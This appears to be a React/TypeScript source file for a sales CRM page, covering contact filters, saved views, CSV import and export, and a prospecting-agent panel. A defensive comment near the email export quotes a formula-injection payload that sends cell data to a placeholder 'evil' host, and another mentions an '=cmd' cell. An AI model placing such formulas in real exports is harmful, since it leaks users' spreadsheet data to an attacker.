import { useEffect, useState } from "react";
import { useFetcher } from "react-router";
import {
  ago,
  buildNameIndex,
  CH,
  companyContextFor,
  type Contact,
  type Deal,
  hasNameConflict,
  isArrFigure,
  loopBadge,
  needsAttention,
  statusMeta,
  statusPill,
  STATUSES,
  type Viewer,
} from "./data";
import {
  Box,
  Checkbox,
  css,
  GLOBAL_CSS,
  IconCheck,
  IconChevronDown,
  IconChevronRight,
  IconClose,
  IconFilter,
  IconPlus,
  IconProspect,
  IconSave,
  IconSearch,
  IconTrash,
  IconUpload,
  IconWarn,
  MONO,
} from "./ui";
import {
  defaultCondition,
  defaultValueForField,
  matchesConditions,
  optionsForField,
  resolveSavedView,
  savedViewKey,
  VIEW_FIELDS,
  VIEW_OP_LABELS,
  VIEW_OPS,
  type SavedView,
  type ViewCondition,
  type ViewOp,
} from "./views";
import { ProspectingPanel } from "./prospecting-panel";
import { buildRunView, type RunView } from "./prospecting";
import { buildOwnerTabs, buildViewTabs, Sidebar } from "./sidebar";
import {
  ArrLabel,
  CategoryTag,
  ContactDetail,
  DeadReasonModal,
  DeleteContactsModal,
  LinkedinButton,
  linkedinUrl,
  needsDeadReason,
  NO_TOUCH,
  ownerMeta,
  SourceTag,
} from "./contact-detail";
import {
  csvCell,
  LIMITS,
  MAX_CSV_BYTES,
  MAX_IMPORT_ROWS,
  MAX_VIEW_CONDITIONS,
} from "../lib/validate";

/**
 * Split one CSV line into fields, honouring double-quoted values.
 *
 * The previous `line.split(/[,\t]/)` broke on any quoted field containing a
 * comma — `"Smith, John",Acme` shifted every subsequent column by one, so
 * company/owner/status/email landed in the wrong fields. (Quoted values
 * spanning multiple lines are still unsupported; contact exports don't produce
 * them, and the caller splits on newlines before reaching here.)
 */
function splitCsvLine(line: string): string[] {
  const out: string[] = [];
  let field = "";
  let inQuotes = false;
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (inQuotes) {
      if (c === '"') {
        // A doubled quote inside a quoted field is a literal quote.
        if (line[i + 1] === '"') {
          field += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        field += c;
      }
    } else if (c === '"') {
      inQuotes = true;
    } else if (c === "," || c === "\t") {
      out.push(field.trim());
      field = "";
    } else {
      field += c;
    }
  }
  out.push(field.trim());
  return out;
}

type FormState = {
  name: string;
  company: string;
  email: string;
  phone: string;
  linkedin: string;
  loops: number[];
  owner: string;
  status: string;
  source: string;
};

type State = {
  /**
   * The single view selection: "all" | "loop1" | "loop2", or a saved view's
   * `savedViewKey(id)`. Keeping saved views in this one slot rather than adding a
   * parallel axis is what lets the owner, source, stage and search filters keep
   * layering on top with no change.
   */
  view: string;
  owner: string;
  sourceFilter: string;
  stage: string;
  query: string;
  selectedIds: string[];
  selectedId: string | null;
  menuId: string | null;
  detailMenu: boolean;
  noteDraft: string;
  modal: string | null;
  /** Contact awaiting a dead-reason choice in the "deadReason" modal. */
  pendingDeadId: string | null;
  form: FormState;
  csvText: string;
  csvError: string;
  csvDragging: boolean;
  csvFileName: string;
  deleteIds: string[];
  actionError: string;
  /** The "New view" builder card, and the view being drafted in it. */
  viewBuilder: boolean;
  draftConditions: ViewCondition[];
  viewName: string;
  viewShared: boolean;
  // The prospecting agent's slide-over. Its results are NOT here: they live in
  // /api/prospect's payload, the same way contacts live in the loader. These are
  // the panel's own UI knobs.
  prospectOpen: boolean;
  prospectDraft: string;
  /** Which thread the panel is showing. Empty until a run is started or restored. */
  prospectRunId: string;
  prospectSelected: string[];
  prospectLoop: number;
  prospectOwner: string;
  prospectSource: string;
  prospectError: string;
};

// Mirrors the route action's return type. `message` carries a partial-success
// note — currently "Imported N contacts. Skipped M already in the CRM (…). Skipped
// K invalid rows" from a CSV import, where either skip clause appears only when
// it is nonzero; `savedViewId` is present only on a successful createSavedView.
/**
 * What /api/prospect's loader returns. Declared by hand, mirroring that route,
 * the same way ActionResult below mirrors this page's action.
 */
type ProspectPayload = {
  ok: boolean;
  running?: boolean;
  configured?: boolean;
  turns?: RunView[];
  error?: string;
};

/**
 * What /api/prospect's action returns. `runId` rides on both variants: a
 * successful start names the new run, and a REFUSED start names the run that
 * refused it, so the panel can show that one instead of leaving the user with an
 * error and no way to reach it.
 */
type ProspectActionResult =
  | { ok: true; runId?: string; message?: string }
  | { ok: false; error: string; runId?: string };

type ActionResult =
  | { ok: true; message?: string; savedViewId?: string }
  | { ok: false; error: string };

const blankForm = (loops?: number[]): FormState => ({
  name: "",
  company: "",
  email: "",
  phone: "",
  linkedin: "",
  loops: loops || [1],
  owner: "Tom",
  status: "New",
  source: "",
});

// Outreach channels offered in the detail panel's "Log touch" row. `meeting` is
// deliberately absent — the "Log as meeting note" button above already records
// one, and it requires a note where these don't.
export type { Viewer } from "./data";

export function SalesLoopCRM({
  contacts,
  savedViews,
  deals,
  viewer,
}: {
  contacts: Contact[];
  savedViews: SavedView[];
  /** Only feeds the detail panel's "Also at [Company]" block. */
  deals: Deal[];
  viewer: Viewer;
}) {
  const fetcher = useFetcher();
  // TWO MORE fetchers, a deliberate departure from this page's one-fetcher
  // idiom, and they have to be two rather than one.
  //
  // Separate from `fetcher` above: the panel polls /api/prospect every few
  // seconds for as long as a run is going, and sharing that fetcher would
  // overwrite its data on a timer and re-fire the settle effect that owns every
  // modal on this page, closing them under the user mid-edit.
  //
  // Separate from EACH OTHER for the same reason one level down. A fetcher holds
  // a single `data`, so one serving both roles loses the polled thread the
  // moment it submits a write — which orphaned the run it had just started and
  // left the panel looking like nothing had happened.
  const prospectPoll = useFetcher();
  const prospectWrite = useFetcher();
  const [state, setState] = useState<State>(() => ({
    view: "all",
    owner: "all",
    sourceFilter: "all",
    stage: "all",
    query: "",
    selectedIds: [],
    selectedId: null,
    menuId: null,
    detailMenu: false,
    noteDraft: "",
    modal: null,
    pendingDeadId: null,
    form: blankForm([1]),
    csvText: "",
    csvError: "",
    csvDragging: false,
    csvFileName: "",
    deleteIds: [],
    actionError: "",
    viewBuilder: false,
    draftConditions: [],
    viewName: "",
    viewShared: true,
    prospectOpen: false,
    prospectDraft: "",
    prospectRunId: "",
    prospectSelected: [],
    prospectLoop: 1,
    prospectOwner: "Unassigned",
    prospectSource: "",
    prospectError: "",
  }));

  const patch = (u: Partial<State> | ((s: State) => Partial<State>)) =>
    setState((s) => ({ ...s, ...(typeof u === "function" ? u(s) : u) }));

  const S = state;

  // Persistence goes through the route action; React Router revalidates the
  // loader after each write, so `contacts` (a prop) is always fresh. This effect
  // only reconciles modal/error UI once a submission settles.
  const submit = (fields: Record<string, string>) =>
    fetcher.submit(fields, { method: "post" });

  useEffect(() => {
    if (fetcher.state !== "idle" || !fetcher.data) return;
    const result = fetcher.data as ActionResult;
    if (result.ok && result.savedViewId) {
      // Only createSavedView returns an id, which is what makes this safe to act
      // on: a row's status menu is still reachable with the builder open, and
      // closing the card on *any* successful intent would discard a half-written
      // view. Selecting the returned id beats reading "the newest view" off the
      // revalidated loader, which would race another user's save.
      patch({
        viewBuilder: false,
        draftConditions: [],
        viewName: "",
        viewShared: true,
        actionError: "",
        menuId: null,
        sourceFilter: "all",
        view: savedViewKey(result.savedViewId),
      });
      return;
    }
    if (result.ok) {
      // A partial success (some import rows rejected) holds the modal open so
      // the user actually sees which rows didn't land — closing it would report
      // a clean import that wasn't one.
      const notice = result.message ?? "";
      patch((s) =>
        s.modal
          ? notice
            ? { csvText: "", csvError: notice, actionError: "", deleteIds: [] }
            : { modal: null, csvText: "", csvError: "", actionError: "", deleteIds: [], pendingDeadId: null }
          : {},
      );
    } else {
      patch({ actionError: result.error });
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [fetcher.state, fetcher.data]);

  // ---------------------------------------------------------------------
  // Prospecting agent
  // ---------------------------------------------------------------------

  // Reading the panel's state comes from the POLL fetcher and nothing else.
  //
  // These two must not be the same fetcher. A fetcher holds one `data`, so a
  // submit overwrites whatever the last load returned: the panel would lose the
  // thread the instant it started a run, `running` would drop to false, polling
  // would never begin, and the orphaned run then blocked every retry with "a run
  // is already going". That is the same hazard the comment on prospectPoll's
  // declaration describes for the page's main fetcher, one level down.
  const pollData = prospectPoll.data as ProspectPayload | undefined;
  const writeData = prospectWrite.data as ProspectActionResult | undefined;
  const turns: RunView[] = pollData?.turns ?? [];
  const prospectRunning = !!pollData?.running;
  const prospectConfigured = pollData?.configured !== false;
  const pollBusy = prospectPoll.state !== "idle";
  const writeBusy = prospectWrite.state !== "idle";
  const prospectPending = pollBusy || writeBusy;
  const activeRunId = S.prospectRunId || turns[turns.length - 1]?.run.id || "";

  // Starting a run makes a real Origami call, so the POST can take a couple of
  // seconds. Echo the brief straight from the in-flight form data meanwhile, or
  // the panel looks like it swallowed what the user just typed.
  const prospectSending =
    writeBusy && prospectWrite.formData?.get("intent") === "startRun"
      ? String(prospectWrite.formData.get("prompt") ?? "")
      : "";

  /** GET, never POST: a POST would revalidate the whole contact list on a timer. */
  const loadProspects = (runId: string) =>
    prospectPoll.load(runId ? `/api/prospect?run=${encodeURIComponent(runId)}` : "/api/prospect");

  /**
   * Drive the run forward.
   *
   * The server decides when a tick actually costs an Origami call (see
   * next_poll_at in migration 0013); this cadence exists so the panel's elapsed
   * timer stays honest, not because the provider is asked this often.
   */
  useEffect(() => {
    if (!S.prospectOpen || !prospectRunning || prospectPending) return;
    const timer = setTimeout(() => loadProspects(activeRunId), 3_000);
    return () => clearTimeout(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [S.prospectOpen, prospectRunning, prospectPending, activeRunId]);

  // Fold a settled WRITE back into the panel, and pick the run up immediately.
  // The load is what starts the polling loop — without it a freshly started run
  // sits there with nothing watching it.
  useEffect(() => {
    if (prospectWrite.state !== "idle" || !writeData) return;
    // A failure can still name a run: a blocked start returns the id of the run
    // that is blocking it, so the panel can show that one rather than just
    // refusing and leaving the user with no way to see or cancel it.
    if (writeData.runId) patch({ prospectRunId: writeData.runId });
    if (!writeData.ok) {
      patch({ prospectError: writeData.error });
      if (writeData.runId) loadProspects(writeData.runId);
      return;
    }
    patch({ prospectError: "", prospectSelected: [] });
    loadProspects(writeData.runId || activeRunId);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [prospectWrite.state, prospectWrite.data]);

  // Drop selections whose prospect is gone: a re-read of the agent's table
  // replaces its rows, so an id from the previous read may no longer exist.
  useEffect(() => {
    if (prospectPoll.state !== "idle" || !pollData) return;
    setState((s) => {
      const live = new Set(
        (pollData.turns ?? []).flatMap((t) => t.visible.map((p) => p.id)),
      );
      const kept = s.prospectSelected.filter((id) => live.has(id));
      return kept.length === s.prospectSelected.length ? s : { ...s, prospectSelected: kept };
    });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [prospectPoll.state, prospectPoll.data]);

  const openProspect = () => {
    patch({ prospectOpen: true, prospectError: "" });
    // Restore whatever this viewer last ran. Deliberately not in the page
    // loader: most visits never open the panel and shouldn't pay for the reads.
    if (!pollData) loadProspects("");
  };

  const closeProspect = () => patch({ prospectOpen: false, prospectError: "" });

  const sendProspect = () => {
    const prompt = S.prospectDraft.trim();
    if (!prompt) return;
    prospectWrite.submit(
      // runId continues the existing thread when there is one, which is how a
      // needs_input question gets answered and how a stalled run is resumed.
      { intent: "startRun", prompt, runId: activeRunId },
      { method: "post", action: "/api/prospect" },
    );
    patch({ prospectDraft: "", prospectError: "" });
  };

  const promoteProspects = () => {
    if (!activeRunId || !S.prospectSelected.length) return;
    prospectWrite.submit(
      {
        intent: "promote",
        runId: activeRunId,
        ids: JSON.stringify(S.prospectSelected),
        loop: String(S.prospectLoop),
        owner: S.prospectOwner,
        source: S.prospectSource,
      },
      { method: "post", action: "/api/prospect" },
    );
    patch({ prospectSelected: [] });
  };

  const cancelProspect = () => {
    if (!activeRunId) return;
    prospectWrite.submit(
      { intent: "cancel", runId: activeRunId },
      { method: "post", action: "/api/prospect" },
    );
  };

  // Served by the route as a text/csv attachment rather than built from a Blob
  // here: the escaping that stops a scraped "=cmd" cell executing in Excel lives
  // in csvCell on the server, with the rest of the output escaping.
  const exportProspects = () => {
    if (!activeRunId) return;
    window.location.href = `/api/prospect?run=${encodeURIComponent(activeRunId)}&format=csv`;
  };

  const toggleProspect = (id: string) =>
    patch((s) => ({
      prospectSelected: s.prospectSelected.includes(id)
        ? s.prospectSelected.filter((x) => x !== id)
        : [...s.prospectSelected, id],
    }));

  const toggleAllProspects = (ids: string[]) =>
    patch((s) => ({ prospectSelected: s.prospectSelected.length === ids.length ? [] : ids }));

  // Contacts can vanish under the UI (deleted here or in another tab), so drop
  // selection ids that no longer exist and close a detail panel whose contact is
  // gone. Returning the same state object when nothing changed avoids a re-render.
  useEffect(() => {
    const live = new Set(contacts.map((c) => c.id));
    setState((s) => {
      const kept = s.selectedIds.filter((id) => live.has(id));
      const staleDetail = !!s.selectedId && !live.has(s.selectedId);
      if (kept.length === s.selectedIds.length && !staleDetail) return s;
      return {
        ...s,
        selectedIds: kept,
        ...(staleDetail ? { selectedId: null, detailMenu: false } : {}),
      };
    });
  }, [contacts]);

  // ---- handlers ----
  // The source filter only applies inside Loop 2, so reset it when leaving.
  const setView = (v: string) =>
    patch(v === "loop2" ? { view: v, menuId: null } : { view: v, menuId: null, sourceFilter: "all" });
  const setOwner = (o: string) => patch({ owner: o, menuId: null });
  const setSourceFilter = (s: string) => patch({ sourceFilter: s, menuId: null });
  const setStage = (s: string) => patch({ stage: s, menuId: null });
  const onSearch = (e: any) => patch({ query: e.target.value });
  const toggleSelect = (id: string, e?: any) => {
    if (e) e.stopPropagation();
    patch((s) => ({
      selectedIds: s.selectedIds.includes(id)
        ? s.selectedIds.filter((x) => x !== id)
        : [...s.selectedIds, id],
    }));
  };
  const clearSelection = () => patch({ selectedIds: [] });
  const open = (id: string) =>
    patch({ selectedId: id, noteDraft: "", menuId: null, detailMenu: false });
  const close = () => patch({ selectedId: null, detailMenu: false });
  const toggleMenu = (id: string, e?: any) => {
    if (e) e.stopPropagation();
    patch((s) => ({ menuId: s.menuId === id ? null : id }));
  };
  const toggleDetailMenu = () => patch((s) => ({ detailMenu: !s.detailMenu }));
  // Both status menus (row and detail) funnel through here, so intercepting Dead
  // once covers both. The write is deferred until a reason is picked or skipped.
  const setStatus = (id: string, status: string, e?: any) => {
    if (e) e.stopPropagation();
    if (needsDeadReason(status)) {
      patch({ menuId: null, detailMenu: false, modal: "deadReason", pendingDeadId: id, actionError: "" });
      return;
    }
    patch({ menuId: null, detailMenu: false });
    submit({ intent: "setStatus", id, status });
  };
  const confirmDead = (reason: string) => {
    if (!S.pendingDeadId) return;
    submit({ intent: "setStatus", id: S.pendingDeadId, status: "Dead", reason });
  };
  const logTouch = (ch: string) => {
    if (!S.selectedId) return;
    const text = (S.noteDraft || "").trim();
    patch({ noteDraft: "" });
    submit({ intent: "logTouch", id: S.selectedId, ch, text });
  };
  const onNoteInput = (e: any) => patch({ noteDraft: e.target.value });
  const addNote = () => {
    const txt = (S.noteDraft || "").trim();
    if (!txt || !S.selectedId) return;
    patch({ noteDraft: "" });
    submit({ intent: "addNote", id: S.selectedId, text: txt });
  };
  const logMeeting = () => {
    const txt = (S.noteDraft || "").trim();
    if (!txt || !S.selectedId) return;
    patch({ noteDraft: "" });
    submit({ intent: "logMeeting", id: S.selectedId, text: txt });
  };
  const onNoteKey = (e: any) => {
    if ((e.metaKey || e.ctrlKey) && e.key === "Enter") {
      e.preventDefault();
      addNote();
    }
  };
  const snoozeFollow = () => {
    if (!S.selectedId) return;
    submit({ intent: "snooze", id: S.selectedId });
  };
  const clearFollow = () => {
    if (!S.selectedId) return;
    submit({ intent: "clearFollow", id: S.selectedId });
  };
  const resumeLoop1 = () => {
    if (!S.selectedId) return;
    submit({ intent: "resumeLoop1", id: S.selectedId });
  };
  // Kick off a HyperAgent run for this contact. The agent drafts outreach and
  // writes results back through /api/hyperagent; the loader then revalidates.
  const draftOutreach = () => {
    if (!S.selectedId) return;
    submit({ intent: "triggerAgent", id: S.selectedId });
  };

  const defaultLoops = () => (S.view === "loop2" ? [2] : [1]);
  const openAdd = () =>
    patch({ modal: "add", form: blankForm(defaultLoops()), actionError: "" });
  const openCsv = () =>
    patch({
      modal: "csv",
      csvText: "",
      csvError: "",
      actionError: "",
      csvDragging: false,
      csvFileName: "",
    });
  const closeModal = () =>
    patch({
      modal: null,
      csvError: "",
      actionError: "",
      csvDragging: false,
      csvFileName: "",
      deleteIds: [],
      // Dismissing the reason prompt abandons the status change entirely — the
      // contact stays on whatever status it had.
      pendingDeadId: null,
    });

  // ---- saved views ----
  // The builder drafts a view; saving posts it and the settle effect above
  // selects whatever id comes back.
  const openViewBuilder = () =>
    patch({
      viewBuilder: true,
      draftConditions: [defaultCondition()],
      viewName: "",
      viewShared: true,
      actionError: "",
      menuId: null,
    });
  const closeViewBuilder = () =>
    patch({ viewBuilder: false, draftConditions: [], viewName: "", actionError: "" });
  const addCondition = () =>
    patch((s) =>
      s.draftConditions.length >= MAX_VIEW_CONDITIONS
        ? {}
        : { draftConditions: [...s.draftConditions, defaultCondition()] },
    );
  const removeCondition = (i: number) =>
    patch((s) => ({ draftConditions: s.draftConditions.filter((_, j) => j !== i) }));
  // Changing a row's field resets its value: a status value surviving a switch to
  // `owner` would leave a clause that silently matches nothing.
  const setConditionField = (i: number, field: string) =>
    patch((s) => ({
      draftConditions: s.draftConditions.map((c, j) =>
        j === i ? { ...c, field, value: defaultValueForField(field) } : c,
      ),
    }));
  const setConditionOp = (i: number, op: ViewOp) =>
    patch((s) => ({
      draftConditions: s.draftConditions.map((c, j) => (j === i ? { ...c, op } : c)),
    }));
  const setConditionValue = (i: number, value: string) =>
    patch((s) => ({
      draftConditions: s.draftConditions.map((c, j) => (j === i ? { ...c, value } : c)),
    }));
  const saveView = () => {
    // The server validates both of these too; checking here keeps the message
    // instant rather than costing a round trip to say "name it".
    if (!S.viewName.trim()) return patch({ actionError: "View name is required." });
    if (!S.draftConditions.length) return patch({ actionError: "Add at least one condition." });
    submit({
      intent: "createSavedView",
      name: S.viewName.trim(),
      shared: S.viewShared ? "1" : "0",
      conditions: JSON.stringify(S.draftConditions),
    });
  };
  // No confirm modal, unlike a contact: a view is three dropdowns, and the audit
  // snapshot makes it recoverable. If the deleted view was selected, byView's
  // fallback puts the page back on "All contacts" — see `activeSavedView`.
  const removeView = (id: string) => submit({ intent: "deleteSavedView", id });

  // Deleting is irreversible (notes and touchpoints go with the contact), so it
  // always routes through the confirm modal. `deleteIds` carries the pending
  // targets, which is what makes one flow serve both the detail panel and the
  // bulk selection bar.
  const askDelete = (ids: string[]) => {
    if (!ids.length) return;
    patch({ modal: "delete", deleteIds: ids, actionError: "", menuId: null, detailMenu: false });
  };
  const confirmDelete = () => {
    if (!S.deleteIds.length) return;
    submit({ intent: "deleteContacts", ids: JSON.stringify(S.deleteIds) });
  };

  // Read a dropped/selected .csv into the paste textarea, then the existing
  // importCsv parser handles it. FileReader only runs in these browser event
  // handlers (never during SSR), so there's no hydration concern.
  const readCsvFile = (file: File | null | undefined) => {
    if (!file) return;
    const isCsv =
      /\.csv$/i.test(file.name) ||
      file.type === "text/csv" ||
      file.type === "application/vnd.ms-excel" ||
      file.type === "text/plain";
    if (!isCsv) {
      patch({ csvError: "That doesn’t look like a .csv file.", csvDragging: false });
      return;
    }
    // Bounded before reading. The whole file is held in component state and
    // re-serialized into the submitted form, so an unbounded upload is held in
    // memory twice and POSTed as one body.
    if (file.size > MAX_CSV_BYTES) {
      patch({
        csvError: `That file is too large (max ${Math.round(MAX_CSV_BYTES / 1024 / 1024)}MB).`,
        csvDragging: false,
      });
      return;
    }
    const reader = new FileReader();
    reader.onload = () =>
      patch({
        csvText: typeof reader.result === "string" ? reader.result : "",
        csvError: "",
        csvDragging: false,
        csvFileName: file.name,
      });
    reader.onerror = () =>
      patch({ csvError: "Couldn’t read that file.", csvDragging: false });
    reader.readAsText(file);
  };
  const onCsvDrop = (e: any) => {
    e.preventDefault();
    readCsvFile(e.dataTransfer?.files?.[0]);
  };
  const onCsvDragOver = (e: any) => {
    e.preventDefault();
    if (!S.csvDragging) patch({ csvDragging: true });
  };
  const onCsvDragLeave = (e: any) => {
    e.preventDefault();
    patch({ csvDragging: false });
  };
  const onCsvFileInput = (e: any) => {
    readCsvFile(e.target.files?.[0]);
    e.target.value = ""; // allow re-selecting the same file
  };
  const setForm = (p: Partial<FormState>) =>
    patch((s) => ({ form: { ...s.form, ...p } }));
  const toggleFormLoop = (n: number) =>
    patch((s) => {
      const has = s.form.loops.includes(n);
      let loops = has ? s.form.loops.filter((x) => x !== n) : [...s.form.loops, n];
      if (!loops.length) loops = [n];
      return { form: { ...s.form, loops: loops.sort() } };
    });
  const submitAdd = () => {
    const f = S.form;
    if (!f.name.trim()) return;
    submit({
      intent: "addContact",
      name: f.name.trim(),
      company: (f.company || "").trim(),
      email: (f.email || "").trim(),
      phone: (f.phone || "").trim(),
      linkedin: (f.linkedin || "").trim(),
      loops: JSON.stringify(f.loops.length ? f.loops : [1]),
      owner: f.owner === "Unassigned" ? "" : f.owner,
      status: f.status || "New",
      source: f.loops.includes(2) ? f.source.trim() : "",
    });
  };
  const importCsv = () => {
    const raw = (S.csvText || "").trim();
    if (!raw) {
      patch({ csvError: "Drop a .csv file first." });
      return;
    }
    const rows = raw
      .split(/\r?\n/)
      .map((l) => l.trim())
      .filter(Boolean);
    const parseLoops = (v: string) => {
      const s = (v || "").toLowerCase();
      const out: number[] = [];
      if (/\b1\b|loop\s*1|general|outbound/.test(s)) out.push(1);
      if (/\b2\b|loop\s*2|event|blitz|community/.test(s)) out.push(2);
      return out.length ? out : [S.view === "loop2" ? 2 : 1];
    };
    const parseOwner = (v: string) => {
      const s = (v || "").trim().toLowerCase();
      if (s.startsWith("t")) return "Tom";
      if (s.startsWith("b")) return "Britton";
      return null;
    };
    const parseStatus = (v: string) => {
      const s = (v || "").trim().toLowerCase();
      const hit = STATUSES.find((x) => x.id.toLowerCase() === s);
      return hit ? hit.id : "New";
    };
    if (rows.length > MAX_IMPORT_ROWS + 1) {
      patch({
        csvError: `That file has too many rows (max ${MAX_IMPORT_ROWS}). Split it and import in batches.`,
      });
      return;
    }
    let start = 0;
    const first = rows[0].toLowerCase();
    if (
      /name/.test(first) &&
      /company|loop|owner|source|community|event|email|phone|linkedin/.test(first)
    )
      start = 1;
    const made = [];
    for (let i = start; i < rows.length; i++) {
      const cols = splitCsvLine(rows[i]);
      if (!cols[0]) continue;
      const loops = parseLoops(cols[2]);
      made.push({
        name: cols[0],
        company: cols[1] || "",
        loops,
        owner: parseOwner(cols[3]),
        status: parseStatus(cols[4]),
        source: loops.includes(2) ? cols[5] || "" : "",
        email: cols[6] || "",
        phone: cols[7] || "",
        linkedin: cols[8] || "",
      });
    }
    if (!made.length) {
      patch({
        csvError:
          "Couldn’t read any contacts. Use: Name, Company, Loop, Owner, Status, Source, Email, Phone, LinkedIn",
      });
      return;
    }
    submit({ intent: "importContacts", rows: JSON.stringify(made) });
  };

  // ---- derived ----
  // A saved view can vanish under the UI (deleted here, or by another user in
  // another tab). Resolving the selection during render rather than reconciling
  // it in an effect means no frame is ever rendered against a dead id — the same
  // choice ab.ts makes for the templates page's selected card.
  const activeSavedView = resolveSavedView(savedViews, S.view);

  // Three-way, not the two-way ternary this used to be: with a fourth kind of
  // view key in play, an `else` branch meaning "Loop 2" would silently apply the
  // Loop 2 filter to a saved view — and to a view that has just been deleted.
  // Unrecognised keys fall back to "all".
  const byView = (c: Contact) =>
    activeSavedView
      ? matchesConditions(c, activeSavedView.conditions)
      : S.view === "loop1"
        ? c.loops.includes(1)
        : S.view === "loop2"
          ? c.loops.includes(2)
          : true;
  const byOwner = (c: Contact) =>
    S.owner === "all"
      ? true
      : S.owner === "unassigned"
        ? !c.owner
        : c.owner === S.owner;
  const q = S.query.trim().toLowerCase();
  const byQuery = (c: Contact) =>
    !q ||
    c.name.toLowerCase().includes(q) ||
    c.company.toLowerCase().includes(q);
  const bySource = (c: Contact) =>
    S.sourceFilter === "all" || (c.source || "") === S.sourceFilter;
  const byStage = (c: Contact) =>
    S.stage === "all"
      ? true
      : S.stage === "untouched"
        ? c.touches.length === 0
        : c.status === S.stage;

  // Cross-owner duplicate detection (same name under 2+ owners).
  const nameIndex = buildNameIndex(contacts);

  // Distinct Loop 2 sources present in the data, with counts, for the sidebar.
  const sourceCounts = new Map<string, number>();
  for (const c of contacts) {
    const s = (c.source || "").trim();
    if (s) sourceCounts.set(s, (sourceCounts.get(s) ?? 0) + 1);
  }
  const sources = [...sourceCounts.keys()].sort((a, b) => a.localeCompare(b));

  // How many contacts the view being drafted would hold. Counted over `contacts`,
  // never `visible`: a figure computed inside the currently active view/owner/
  // stage/search would promise a number the saved view will never reproduce.
  const draftMatches = contacts.filter((c) =>
    matchesConditions(c, S.draftConditions),
  ).length;

  // Counts are over the unfiltered list — see buildViewTabs. `setView` (not the
  // sidebar) owns resetting the Loop 2 source filter when leaving that view.
  // Saved views are appended as further rows of the same VIEWS group rather than
  // taught to buildViewTabs, which stays the three built-ins shared by five pages.
  const viewTabs = [
    ...buildViewTabs(contacts, S.view, setView),
    ...savedViews.map((v) => ({
      key: savedViewKey(v.id),
      label: v.name,
      dot: "#6d3fc4",
      count: contacts.filter((c) => matchesConditions(c, v.conditions)).length,
      active: S.view === savedViewKey(v.id),
      onClick: () => setView(savedViewKey(v.id)),
      onDelete: () => removeView(v.id),
    })),
  ];
  const ownerTabs = buildOwnerTabs(contacts, S.owner, setOwner);

  // Base set for the SOURCE filter row (Loop 2 only) - everything except the
  // source and stage filters, so per-source counts reflect the current view.
  const sourceBase = contacts.filter(
    (c) => byView(c) && byOwner(c) && byQuery(c),
  );
  const sourceInViewCounts = new Map<string, number>();
  for (const c of sourceBase) {
    const s = (c.source || "").trim();
    if (s) sourceInViewCounts.set(s, (sourceInViewCounts.get(s) ?? 0) + 1);
  }
  const sourcesInView = [...sourceInViewCounts.keys()].sort((a, b) =>
    a.localeCompare(b),
  );
  const sourceTabs = sourcesInView.length
    ? [
        { key: "all", label: "All sources", count: sourceBase.length },
        ...sourcesInView.map((s) => ({
          key: s,
          label: s,
          count: sourceInViewCounts.get(s) ?? 0,
        })),
      ].map((t) => ({
        ...t,
        active: S.sourceFilter === t.key,
        onClick: () => setSourceFilter(t.key),
      }))
    : [];

  // Base set for the STAGE filter bar - everything except the stage filter, so
  // the per-stage counts reflect what's reachable under the current view.
  const stageBase = contacts.filter(
    (c) => byView(c) && byOwner(c) && bySource(c) && byQuery(c),
  );
  const stageTabs = [
    { key: "all", label: "All stages", dot: "", count: stageBase.length },
    {
      key: "untouched",
      label: "Not touched",
      dot: "#c4c4be",
      count: stageBase.filter((c) => c.touches.length === 0).length,
    },
    ...STATUSES.map((s) => ({
      key: s.id,
      label: s.id,
      dot: s.dot,
      count: stageBase.filter((c) => c.status === s.id).length,
    })),
  ].map((t) => ({ ...t, active: S.stage === t.key, onClick: () => setStage(t.key) }));

  const visible = stageBase.filter(byStage);

  // ---- selection / bulk actions ----
  const visibleIds = visible.map((c) => c.id);
  const selectedSet = new Set(S.selectedIds);
  const selectedCount = S.selectedIds.length;
  const allVisibleSelected =
    visibleIds.length > 0 && visibleIds.every((id) => selectedSet.has(id));
  const someVisibleSelected = visibleIds.some((id) => selectedSet.has(id));
  const toggleSelectAll = () =>
    patch((s) => {
      const set = new Set(s.selectedIds);
      if (visibleIds.every((id) => set.has(id))) {
        // all visible already selected → clear just the visible ones
        visibleIds.forEach((id) => set.delete(id));
      } else {
        visibleIds.forEach((id) => set.add(id));
      }
      return { selectedIds: [...set] };
    });
  // Selected contacts that actually have an email - the export subset.
  const selectedContacts = contacts.filter((c) => selectedSet.has(c.id));
  const selectedEmails = selectedContacts
    .map((c) => ({ name: c.name, email: (c.email || "").trim() }))
    .filter((c) => c.email);
  const exportEmails = () => {
    if (!selectedEmails.length) return;
    // csvCell also neutralizes leading = + - @ so a contact named
    // `=HYPERLINK("https://evil/"&A1,"Click")` is text, not a formula, when the
    // export is opened in Excel or Sheets.
    const csv =
      "name,email\n" +
      selectedEmails.map((c) => csvCell(c.name) + "," + csvCell(c.email)).join("\n") +
      "\n";
    const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "emails.csv";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  };
  const markAdsSent = () => {
    if (!selectedCount) return;
    submit({ intent: "markAdsSent", ids: JSON.stringify(S.selectedIds) });
  };
  const deleteSelected = () => askDelete([...S.selectedIds]);

  // Pending-delete summary for the confirm modal. Resolved against `contacts` so
  // a single target can be named; a count covers the bulk case.
  const deleteTargets = contacts.filter((c) => S.deleteIds.includes(c.id));
  const deleteLabel =
    deleteTargets.length === 1
      ? "“" + deleteTargets[0].name + "”"
      : deleteTargets.length + " contacts";
  // One fetcher serves every write on this page, so "a submission is in flight"
  // is a single fact — shared by the delete modal's confirm button and the view
  // builder's Save.
  const submitPending = fetcher.state !== "idle";

  // The contact awaiting a dead-reason choice. Empty when it has been deleted out
  // from under the modal, in which case the prompt just drops the name.
  const deadTargetName = contacts.find((c) => c.id === S.pendingDeadId)?.name ?? "";

  const prio = (c: Contact) => {
    if (!c.owner) return 0;
    if (c.followUp !== null && c.followUp <= 0) return 1;
    if (c.status === "Meeting booked") return 2;
    return 3;
  };
  const queueSrc = contacts
    .filter((c) => byView(c) && byOwner(c) && bySource(c))
    .map((c) => ({ c, att: needsAttention(c) }))
    .filter((x) => x.att.flag)
    .sort(
      (a, b) => prio(a.c) - prio(b.c) || (a.c.followUp ?? 99) - (b.c.followUp ?? 99),
    )
